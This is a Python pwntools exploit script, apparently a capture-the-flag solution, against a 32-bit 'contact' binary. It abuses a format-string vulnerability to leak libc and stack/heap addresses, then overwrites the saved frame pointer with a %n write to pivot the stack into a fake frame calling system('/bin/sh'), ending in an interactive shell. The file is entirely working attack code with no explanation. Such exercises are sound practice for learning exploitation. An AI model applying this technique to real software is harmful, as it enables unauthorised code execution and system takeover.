from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./contact"
libc_binary = "/lib/i386-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)
context.arch = "i386"

def create(name,description):
    p.sendlineafter(">>> ","1")
    p.sendlineafter("\tName: ",str(name))
    p.sendlineafter("\tEnter Phone No: ","1111")
    p.sendlineafter("\tLength of description: ","1111")
    p.sendlineafter("\tEnter description:\n\t\t",str(description))

def show():
    p.sendlineafter(">>> ","4")


# leak
create("aaaa","%31$p")
show()
p.recvuntil("\tDescription: ")
libc_start_main = int(p.recvuntil("\n",drop=True),16) - 247
log.success("libc_start_main is -> " + hex(libc_start_main))

libc_base = libc_start_main - libc.sym["__libc_start_main"]
system_addr = libc_base + libc.sym["system"]
sh_addr = libc_base + libc.search('/bin/sh').next()
log.success("sh_addr is -> " + hex(sh_addr))

log.success("system addr is -> " + hex(system_addr))

# stack privot
# step1,leak heapaddr
payload = flat([
    system_addr,
    'bbbb',
    sh_addr,
    '%6$p%11$pcccc',
])
create("bbbb",payload)
# gdb.attach(p,"b *0x8048c22")
show()
p.recvuntil("Description: ")
p.recvuntil("Description: ")
data = p.recvuntil("cccc",drop=True)
print data
data = data.split("0x")

ebp_addr = int(data[1], 16)
heap_addr = int(data[2], 16)

log.success("ebp_addr is ->" + hex(ebp_addr))
log.success("heap_addr is -> " + hex(heap_addr))

## modify ebp
part1 = (heap_addr - 4) / 2
part2 = heap_addr - 4 - part1
payload = '%' + str(part1) + 'c%' + str(part2) + 'c%6$n'
# payload=fmtstr_payload(6,{ebp_addr:heap_addr})
create("3333",payload)
gdb.attach(p,"b *0x8048c22")
show()
p.recvuntil("Description: ")
p.recvuntil("Description: ")
p.recvuntil("Description: ")
p.sendlineafter(">>> ","5")


p.interactive()
